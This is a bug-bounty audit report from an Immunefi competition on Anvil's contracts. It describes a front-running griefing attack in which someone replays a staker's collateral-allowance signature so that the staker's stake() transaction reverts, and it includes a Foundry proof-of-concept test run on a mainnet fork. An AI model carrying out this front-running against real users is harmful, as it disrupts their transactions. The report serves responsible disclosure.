# #36532 \[SC-Medium] Frontrun to invalidate collateralizable approval signature

**Submitted on Nov 5th 2024 at 09:58:52 UTC by @trtrth for** [**Audit Comp | Anvil**](https://immunefi.com/audit-competition/audit-comp-anvil)

* **Report ID:** #36532
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://etherscan.io/address/0xd042C267758eDDf34B481E1F539d637e41db3e5a>
* **Impacts:**
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

The contract \`TimeBasedCollateralPool\` allows a staker to stake using the collateralizable approval signature, which is verified by \`CollateralVault\` contract. In case a staker tries to stake using collateralizable approval signature, a malicious actor can frontrun with the staker's valid signature, which then cause the staker's transaction to be reverted.

## Vulnerability Details

The function \`TimeBasedCollateralPool::stake()\` calls function \`CollateralVault::modifyCollateralizableTokenAllowanceWithSignature()\` if the signature is passed from caller:

\`\`\`solidity function stake(IERC20 \_token, uint256 \_amount, bytes calldata \_collateralizableApprovalSignature) external withEligibleAccountTokensReleased(msg.sender, address(\_token)) returns (uint256) { if (\_collateralizableApprovalSignature.length > 0) { @> collateral.modifyCollateralizableTokenAllowanceWithSignature( msg.sender, address(this), address(\_token), Pricing.safeCastToInt256(\_amount), \_collateralizableApprovalSignature ); }

```
    return _stake(_token, _amount);
}
```

\`\`\`

The function \`CollateralVault::modifyCollateralizableTokenAllowanceWithSignature()\` will update the account's collateralizable allowance if the given signature is valid without any restrictions for the caller. The transaction effectively increases nonce for the signer account.

So there will be cases when a malicious actor front-runs a staker by a transaction calling \`modifyCollateralizableTokenAllowanceWithSignature()\` with the signature collected from staker's \`stake()\` transaction. As a result, the \`stake()\` transaction will be reverted because of invalid nonce

## Impact Details

* Griefing, since the attacker makes no profit and the staker can submit another transaction to successfully stakes

## References

<https://github.com/AcronymFoundation/anvil-contracts/blob/1bbe04bb6f1aa1beea0ebf55e1bad67da3aa0f87/contracts/CollateralVault.sol#L294-L311>

<https://github.com/AcronymFoundation/anvil-contracts/blob/1bbe04bb6f1aa1beea0ebf55e1bad67da3aa0f87/contracts/CollateralVault.sol#L793-L823>

<https://github.com/AcronymFoundation/anvil-contracts/blob/1bbe04bb6f1aa1beea0ebf55e1bad67da3aa0f87/contracts/CollateralVault.sol#L587-L630>

<https://github.com/AcronymFoundation/anvil-contracts/blob/1bbe04bb6f1aa1beea0ebf55e1bad67da3aa0f87/contracts/TimeBasedCollateralPool.sol#L648-L663>

## Proof of Concept

## Proof of Concept

This PoC is created as a Solidity test file under repository <https://github.com/AcronymFoundation/anvil-contracts/tree/main>

\`\`\`solidity pragma solidity 0.8.25;

import "forge-std/Test.sol"; import {TimeBasedCollateralPool} from "src/TimeBasedCollateralPool.sol"; import {CollateralVault} from "src/CollateralVault.sol"; import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract PocTest is Test { CollateralVault collateralVault = CollateralVault(0x5d2725fdE4d7Aa3388DA4519ac0449Cc031d675f);

```
TimeBasedCollateralPool TBCP;

IERC20 usdc &#x3D; IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

address attacker;
address victim;
uint256 victimPK;
bytes32 domainSeparator;
bytes32 private constant TYPE_HASH &#x3D;
    keccak256(&quot;EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)&quot;);

bytes32 internal constant COLLATERALIZABLE_TOKEN_ALLOWANCE_ADJUSTMENT_TYPEHASH &#x3D; keccak256(
    &quot;CollateralizableTokenAllowanceAdjustment(address collateralizableAddress,address tokenAddress,int256 allowanceAdjustment,uint256 approverNonce)&quot;
);

function setUp() public {
    vm.createSelectFork(&quot;https://rpc.ankr.com/eth&quot;, 21120353);

    (victim, victimPK) &#x3D; makeAddrAndKey(&quot;victim&quot;);
    attacker &#x3D; makeAddr(&quot;attacker&quot;);

    deal(address(usdc), victim, 1000e6);

    (, string memory name, string memory version, uint256 chainId, address verifyingContract,,) &#x3D;
        collateralVault.eip712Domain();

    // calc domain separator
    domainSeparator &#x3D; keccak256(
        abi.encode(TYPE_HASH, keccak256(bytes(name)), keccak256(bytes(version)), chainId, verifyingContract)
    );

    // 1. create a TBCP contracts and initialize
    TBCP &#x3D; new TimeBasedCollateralPool();
    TBCP.initialize(
        collateralVault, 3600, address(this), address(this), address(this), address(this), address(this)
    );

    // 2. approve the TBCP contract
    vm.startPrank(collateralVault.owner());
    CollateralVault.CollateralizableContractApprovalConfig[] memory configs &#x3D;
        new CollateralVault.CollateralizableContractApprovalConfig[](1);
    configs[0].collateralizableAddress &#x3D; address(TBCP);
    configs[0].isApproved &#x3D; true;

    collateralVault.upsertCollateralizableContractApprovals(configs);
}

function test_poc() public {
    vm.startPrank(victim);

    // 3. victim approve CollateralVault contract
    usdc.approve(address(collateralVault), 1000e6);

    // 4. victim deposits to CollateralVault
    address[] memory tokens &#x3D; new address[](1);
    uint256[] memory amounts &#x3D; new uint256[](1);

    tokens[0] &#x3D; address(usdc);
    amounts[0] &#x3D; 1000e6;

    collateralVault.depositToAccount(victim, tokens, amounts);

    // 5. victim signs the COLLATERALIZABLE_TOKEN_ALLOWANCE signature
    bytes memory sig &#x3D; _sign_adjust_allowance(victimPK, address(TBCP), address(usdc), int256(1000e6), 0);

    // 6. Attacker frontruns with the above signature
    vm.startPrank(attacker);
    collateralVault.modifyCollateralizableTokenAllowanceWithSignature(
        victim, address(TBCP), address(usdc), int256(1000e6), sig
    );

    // 7. Victim&#x27;s stake() transaction fails
    vm.expectRevert();
    vm.startPrank(victim);
    TBCP.stake(usdc, 1000e6, sig);
}

function _sign_adjust_allowance(uint256 pk, address target, address token, int256 amount, uint256 nonce)
    internal
    view
    returns (bytes memory signature)
{
    bytes32 digest &#x3D; getTypedDataHash(target, token, amount, nonce);

    (uint8 v, bytes32 r, bytes32 s) &#x3D; vm.sign(pk, digest);
    signature &#x3D; abi.encodePacked(r, s, v);
}

function getStructHash(address target, address token, int256 amount, uint256 nonce)
    internal
    pure
    returns (bytes32)
{
    return keccak256(abi.encode(COLLATERALIZABLE_TOKEN_ALLOWANCE_ADJUSTMENT_TYPEHASH, target, token, amount, nonce));
}

function getTypedDataHash(address target, address token, int256 amount, uint256 nonce)
    internal
    view
    returns (bytes32)
{
    return keccak256(abi.encodePacked(&quot;\x19\x01&quot;, domainSeparator, getStructHash(target, token, amount, nonce)));
}
```

}

\`\`\`

The test would pass since the call at step 7 fails due to InvalidSignature error
